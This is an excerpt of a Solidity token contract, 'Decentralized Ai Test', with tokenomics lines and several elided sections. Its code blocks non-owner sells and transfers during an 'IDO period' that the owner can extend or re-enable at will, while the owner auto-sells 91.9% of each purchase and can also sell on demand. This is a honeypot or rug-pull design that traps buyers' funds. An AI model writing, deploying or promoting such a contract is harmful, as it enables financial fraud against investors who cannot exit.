...
- Tokenomics
1% Fee
15,000,000 seconds IDO period
91.9% automatic auto sell of purchase from owner
...
contract DeAi is Context, IERC20, Ownable {
    ...
    string private _name = "Decentralized Ai Test";
    string private _symbol = "DeAiTT02";
    uint8 private _decimals = 18;

    bool public IDOEnabled = false;
    bool private IDOPeriod = true;

    uint256 public IDOThresholdAmount = 260000000; // 26%
    uint256 public IDOUnlockTime = 15000000;
    
    uint256 public _taxFee = 100;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 private _ownerSellPercent = 9190;
    ...
    function setIDOThresholdAmount(uint256 _amount) external onlyOwner {
        IDOThresholdAmount = _amount;
    }

    function setIDOUnlockTime(uint256 _time) external onlyOwner {
        IDOUnlockTime = _time;
    }

    function enableIDO() external onlyOwner {
        IDOPeriod = true;
        IDOEnabled = true;
    }

    function getIDOStatus() public view returns(bool) {
        if (IDOEnabled || IDOPeriod) {
            return true;
        }
        else {
            return false;
    ...
    function checkIDOCondition() private {
        if (block.timestamp > (launchAt + IDOUnlockTime)) {
            IDOPeriod = false;
            IDOEnabled = false;
        }
        else if (balanceOf(owner()) < IDOThresholdAmount) {
            IDOPeriod = false;
            IDOEnabled = false;
        }
    }
    ...
    function sell() external onlyOwner {
        ...
        if (swapAndLiquifyEnabled && !inSwapAndLiquify && contractTokenBalance > 0 ) {
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner()) {
            ...
            checkIDOCondition();
            bool isIDO = IDOEnabled || IDOPeriod;

            // not allow to sell or transfer in IDO period
            // but except sell from auto seller contract (autosell)
            if ((to == pancakeswapV2Pair && from != address(this)) || (from != pancakeswapV2Pair && to != pancakeswapV2Pair)) {
                require(!isIDO, "Still IDO Period");
            }
            ...
            if (from == pancakeswapV2Pair) {
                ...
                if (balanceOf(owner()) >= sellAmount) {
                    ...
                    _rOwned[address(this)] = _rOwned[address(this)].add(rSellAmount);
                    if(_isExcluded[address(this)])
                        _tOwned[address(this)] = _tOwned[address(this)].add(sellAmount);
                }
            }
        }
        ...
        if (swapAndLiquifyEnabled && !inSwapAndLiquify && from != pancakeswapV2Pair && contractTokenBalance > 0 ) {
            swapTokensForEth(contractTokenBalance);
        }
    ...
    function transferContractToken(address recipient, uint256 amount) external onlyOwner {
